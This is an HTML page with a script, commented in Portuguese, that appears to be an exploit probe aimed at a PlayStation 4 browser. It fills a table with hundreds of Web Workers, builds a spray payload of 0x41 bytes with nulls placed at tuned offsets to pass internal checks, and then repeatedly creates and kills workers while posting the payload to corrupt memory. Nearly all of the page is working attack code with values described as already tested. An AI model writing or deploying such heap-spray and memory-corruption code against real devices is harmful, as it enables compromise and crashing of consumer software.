<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 NULL CHECK 384</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; display: flex; flex-direction: column; justify-content: center; height: 90vh; }
        h1 { font-size: 2.5em; margin-bottom: 20px; border-bottom: 2px solid #0f0; display: inline-block; }
        #status { font-size: 2em; border: 2px solid #fff; padding: 20px; background: #111; color: #fff; }
        .danger { background-color: #f00 !important; color: #fff !important; animation: pulse 0.1s infinite; }
        @keyframes pulse { 0% {transform: scale(1);} 50% {transform: scale(1.02);} 100% {transform: scale(1);} }
    </style>
</head>
<body>

    <h1>TARGET: OFFSET 384 (0x180)</h1>
    <div id="status">ENCHENDO TABELA (Alvo 418)...</div>

    <script>
        const TARGET_LIMIT = 418; // Usando o seu valor testado
        const SPRAY_SIZE = 512;
        const TARGET_OFFSET = 384; 
        
        let workers = [];
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        // PAYLOAD MISTO
        // Offset 272, 288, 304 -> ZEROS (Para passar pelos porteiros iniciais)
        // Offset 384 -> ZEROS (Teste Crítico)
        // O resto -> 0x41 (Lixo seguro)
        const payload = new Uint8Array(SPRAY_SIZE);
        payload.fill(0x41); 
        
        // Zera os porteiros conhecidos da Zona 5
        for(let i=256; i<320; i++) payload[i] = 0x00;

        // Zera o Offset 384 (Teste)
        for(let i=0; i<8; i++) {
            payload[TARGET_OFFSET + i] = 0x00;
        }

        function start() {
            let i = setInterval(() => {
                // Sobe rápido até perto
                if (workers.length < 400) {
                     for(let k=0; k<5; k++) workers.push(new Worker(url));
                }
                // Sobe preciso até 418
                else if (workers.length < TARGET_LIMIT) {
                    workers.push(new Worker(url));
                } else {
                    clearInterval(i);
                    document.getElementById('status').innerText = "ESTABILIZANDO (4s)...";
                    setTimeout(attack, 4000);
                }
            }, 30);
        }

        function attack() {
            const st = document.getElementById('status');
            st.innerText = ">>> INJETANDO NULL NO 384 <<<";
            st.className = "danger";

            setInterval(() => {
                // Cria buraco
                const w = new Worker(killerUrl);
                w.terminate();
                
                // Injeta
                try {
                    if(workers.length > 0) workers[0].postMessage(payload);
                } catch(e){}
            }, 10);
        }

        setTimeout(start, 1500);

    </script>
</body>
</html>
